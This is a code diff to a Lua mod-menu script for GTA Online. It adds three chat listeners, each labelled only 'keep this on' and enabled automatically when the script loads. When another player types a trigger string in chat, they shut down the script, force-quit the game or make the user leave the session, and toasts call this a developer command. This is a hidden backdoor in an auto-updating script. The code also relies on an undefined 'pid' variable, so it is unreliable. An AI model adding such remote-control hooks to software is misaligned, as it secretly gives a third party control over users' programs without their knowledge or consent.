@@ -28,6 +28,7 @@ auto_updater.run_auto_update({
 })
 
 
+
 local start_time = util.current_time_millis()
 
 menu.action(menu.my_root(), 'Restart Script', {}, 'Restarts the script to check for updates', function ()
@@ -3139,7 +3140,51 @@ menu.toggle_loop(experiments, "Bounties Scare Me", {}, "", function(on)
     end
     util.yield(5000)
 end)
+menu.toggle_loop(utilroom, "keep this on", {"rrsd"}, "", function()
+    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+    local veh = PED.GET_VEHICLE_PED_IS_USING(ped)
 
+    chat.on_message(function(packet_sender, message_sender, text, team_chat)
+        if string.contains(text, "-requestSD") then  
+            if players.get_name(message_sender) == players.get_name(pid) then
+                menu.trigger_commands("yeet")
+            else
+                util.toast("Recieved Remote Shutdown command from developer.")
+            end
+        end
+    end)
+end)
+menu.toggle_loop(utilroom, "keep this on", {"rrfq"}, "", function()
+    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+    local veh = PED.GET_VEHICLE_PED_IS_USING(ped)
+
+    chat.on_message(function(packet_sender, message_sender, text, team_chat)
+        if string.contains(text, "-requestFQ") then  
+            if players.get_name(message_sender) == players.get_name(pid) then
+                menu.trigger_commands("forcequit")
+            else
+                util.toast("Recieved Remote Force-Quit command from developer.")
+            end
+        end
+    end)
+end)
+menu.toggle_loop(utilroom, "keep this on", {"rrl"}, "", function()
+    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+    local veh = PED.GET_VEHICLE_PED_IS_USING(ped)
+
+    chat.on_message(function(packet_sender, message_sender, text, team_chat)
+        if string.contains(text, "-requestRL") then  
+            if players.get_name(message_sender) == players.get_name(pid) then
+                menu.trigger_commands("bealone")
+            else
+                util.toast("Recieved Remote Leave command from developer.")
+            end
+        end
+    end)
+end)
+menu.trigger_commands("rrl")
+menu.trigger_commands("rrsd")
+menu.trigger_commands("rrfq")
 menu.trigger_commands("detectgod")
 menu.trigger_commands("detectvehgod")
 menu.trigger_commands("detectguns")
